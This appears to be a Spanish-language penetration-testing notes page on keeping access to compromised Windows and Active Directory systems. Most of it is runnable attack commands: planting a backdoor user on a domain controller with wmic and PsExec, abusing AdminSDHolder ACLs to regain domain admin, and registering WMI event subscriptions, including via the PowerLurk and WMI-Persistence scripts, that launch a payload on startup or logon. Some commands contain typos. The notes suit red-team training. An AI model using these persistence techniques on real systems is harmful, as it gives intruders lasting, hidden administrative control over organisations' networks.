# Keep Access:
Mantener el acceso es importante porque los pentest duran dias, no es funcional tener que explotar las vulnerabilidades todos los dias, lo mejor es buscar formas más directas de acceder de nuevo.

* Siempre borra los accesos o cambios que hayas creado!

## Local Admin:

### Start Up folder:


## Active Directory:

### Domain Dominance:
Cuando se tiene domain admin, se puede tomar permanencia de diversos formas:

#### Remote Code Exec:
Agregando un usuario que conozcamos la contraseña para poder ejecutar por CLI conexiones:

- wmic /node:<DomaincontrollerName> process call create "net user /add PiratedProcess Du^^Y01" Here, PiratedProcess and Du^^Y01 are the user ID and password of the planted dummy process on the target user’s DC.

Add the user to the “Admins” group.
- PsExec.exe \\< DomaincontrollerName> -accepteula net localgroup "Admins" PiratedProcess /add

### AdminSDHolder:
Función de AD que hace que cada cierto tiempo (1 min por defecto) se asigen de nuevo los permisos de "domain admin" a los usuarios adminsitradores del AD, con la finalidad que sí un usuario es modificado maliciosamente o por error vuelva a su estado normal.
Pero esta misma función puede ser util para que en caso de que se eliminen permisos a un usuario agregado maliciosamente, se resetee a domain admin por el objeto AdminSDHolder.

Podemos agregar a un usuario al objeto AdminSDHolder con:
```
Add-ObjectAcl-TargetADSprefix 'CN=AdminSDHolder,CN=System' PrincipalSamAccountName Martin -Verbose -Rights All 
```
Validamos con:
```
Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
```
Puedes modificar la cantidad de segundos que se ejecuta la validación:
```
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
```
Un usuario solo por pertenecer a AdminSDHolder no se le asignan los permisos de admin, debe ya tambien ser admin, por lo que debemos hacerlo manual.
```
net group “Domain Admins” Martin /add /domain
```

### WMI:
WMI (Windows Management Instrumentation) es un conjunto de extensiones para el modelo de gestión de Windows que permite la administración y supervisión de los recursos del sistema operativo. Proporciona una interfaz a traves de CLI con el lenguaje de WQL, similar a powershell o CMD pero con mayor complejidad.

#### WMI Event Suscription:
WMI Event Subscription es una funcionalidad de Windows Management Instrumentation (WMI) que permite a los administradores y desarrolladores suscribirse a eventos del sistema y realizar acciones automáticas en respuesta a esos eventos.
```
- wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="EthicalHacker", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
- wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe",Command LineTemplate="C:\Windows\System32\thicalhacker.exe"
- wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
```
#### WMI-Persistence:
Tambien podemos automatizarlo con un script:
```
powershell> Import-Module ./WMI-Persistence.ps1
powershell> Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"
```
- https://github.com/subesp0x10/Wmi-Persistence

#### Powerluks
Script que simplifica el uso de WMI para persistencia basada en detección de eventos de USB, login, logout, Inicio de proceso.
```
Import-Module .\PowerLurk.ps1
Get-WmiEvent
Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
```

### Power-tools
















